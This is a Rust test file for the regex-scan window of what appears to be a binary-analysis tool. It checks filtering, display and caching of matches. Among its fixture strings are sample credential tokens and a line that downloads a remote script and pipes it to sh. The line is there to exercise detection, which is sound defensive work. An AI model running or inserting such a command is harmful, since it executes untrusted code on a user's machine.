// SPDX-License-Identifier: GPL-3.0-only
use super::*;
use antinomie_monitor_core::strings_regex::Origin;
use std::{
    sync::atomic::AtomicUsize,
    time::{Duration, Instant},
};

fn texts(output: &egui::FullOutput) -> Vec<String> {
    fn collect(shape: &egui::epaint::Shape, out: &mut Vec<String>) {
        match shape {
            egui::epaint::Shape::Text(text) => out.push(text.galley.text().to_owned()),
            egui::epaint::Shape::Vec(shapes) => shapes.iter().for_each(|s| collect(s, out)),
            _ => {}
        }
    }
    let mut result = Vec::new();
    for shape in &output.shapes {
        collect(&shape.shape, &mut result);
    }
    result
}

fn scan_of(texts: &[&str]) -> Scan {
    let rules = RuleSet::build(&Config::default());
    let mut scan = Scan::default();
    for text in texts {
        rules.scan_text(
            text,
            &Origin {
                label: "Strings".into(),
                position: Some(0x40),
                unit: 1,
                space: "offset",
            },
            &mut scan,
        );
    }
    scan
}

fn frame(ctx: &egui::Context, window: &mut RegexWindow) -> Vec<String> {
    let output = ctx.run(
        egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::Pos2::ZERO,
                egui::vec2(1200.0, 800.0),
            )),
            ..Default::default()
        },
        |ctx| window.show(ctx, "test"),
    );
    texts(&output)
}

#[test]
fn the_filters_keep_a_category_a_type_or_text_and_order_the_rows() {
    let scan = scan_of(&[
        "http://203.0.113.9/a",
        "AKIAIOSFODNN7EXAMPLE",
        "curl -s http://198.51.100.7/x | sh",
        "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
    ]);
    let all = filtered(&scan, &(None, None, String::new()));
    assert_eq!(all.len(), scan.matches.len());
    let categories: Vec<_> = all.iter().map(|&i| scan.matches[i].category).collect();
    assert!(categories.windows(2).all(|pair| pair[0] <= pair[1]));
    let keys = filtered(&scan, &(Some(Category::Keys), None, String::new()));
    assert_eq!(keys.len(), 2);
    let urls = filtered(&scan, &(None, Some("URL (http)".into()), String::new()));
    assert!(urls.iter().all(|&i| scan.matches[i].kind == "URL (http)"));
    assert!(!urls.is_empty());
    let text = filtered(&scan, &(None, None, "AKIA".into()));
    assert_eq!(text.len(), 1);
    assert_eq!(scan.matches[text[0]].kind, "AWS access key id");
}

#[test]
fn a_window_scans_on_a_worker_lists_the_matches_and_reopens_without_rescanning() {
    let dir = std::env::temp_dir().join(format!("ant-regex-window-{}", std::process::id()));
    remember_data_dir(&dir);
    let calls = Arc::new(AtomicUsize::new(0));
    let counted = Arc::clone(&calls);
    let work: Work = Arc::new(move |rules, _cancel| {
        counted.fetch_add(1, Ordering::Relaxed);
        let mut scan = Scan::default();
        rules.scan_text(
            "beacon to http://203.0.113.9/gate",
            &Origin::default(),
            &mut scan,
        );
        rules.scan_text("key AKIAIOSFODNN7EXAMPLE", &Origin::default(), &mut scan);
        Ok(scan)
    });
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut window = RegexWindow::default();
    assert!(
        frame(&ctx, &mut window).is_empty(),
        "closed windows draw nothing"
    );
    window.open_for("report-1", "sample.elf".into(), Arc::clone(&work));
    let deadline = Instant::now() + Duration::from_secs(10);
    let mut shown = Vec::new();
    while window.scan.is_none() && Instant::now() < deadline {
        shown = frame(&ctx, &mut window);
        std::thread::sleep(Duration::from_millis(20));
    }
    shown.extend(frame(&ctx, &mut window));
    assert_eq!(calls.load(Ordering::Relaxed), 1);
    let scan = window.scan.clone().expect("a finished scan");
    assert_eq!(scan.counts[&Category::Network], 1);
    assert_eq!(scan.counts[&Category::Keys], 1);
    for label in [
        "Regex matches · sample.elf",
        "All",
        "Network",
        "Keys",
        "URL (http)",
        "http://203.0.113.9/gate",
        "AWS access key id",
    ] {
        assert!(
            shown.iter().any(|text| text == label),
            "{label} in {shown:?}"
        );
    }
    // The same report reopens as it was; another one scans afresh.
    window.open = false;
    window.open_for("report-1", "sample.elf".into(), Arc::clone(&work));
    assert!(window.is_open() && window.running.is_none());
    assert_eq!(calls.load(Ordering::Relaxed), 1);
    window.open_for("report-2", "other.elf".into(), work);
    assert!(window.running.is_some() && window.scan.is_none());
    while window.scan.is_none() && Instant::now() < deadline {
        frame(&ctx, &mut window);
        std::thread::sleep(Duration::from_millis(20));
    }
    assert_eq!(calls.load(Ordering::Relaxed), 2);
}

#[test]
fn a_failed_scan_says_why() {
    let dir = std::env::temp_dir().join(format!("ant-regex-window-fail-{}", std::process::id()));
    remember_data_dir(&dir);
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut window = RegexWindow::default();
    window.open_for(
        "r",
        "x".into(),
        Arc::new(|_, _| Err("the listing changed after it was saved".into())),
    );
    let deadline = Instant::now() + Duration::from_secs(10);
    let mut shown = Vec::new();
    while window.error.is_none() && Instant::now() < deadline {
        shown = frame(&ctx, &mut window);
        std::thread::sleep(Duration::from_millis(20));
    }
    shown.extend(frame(&ctx, &mut window));
    assert!(shown
        .iter()
        .any(|text| text.contains("the listing changed after it was saved")));
}
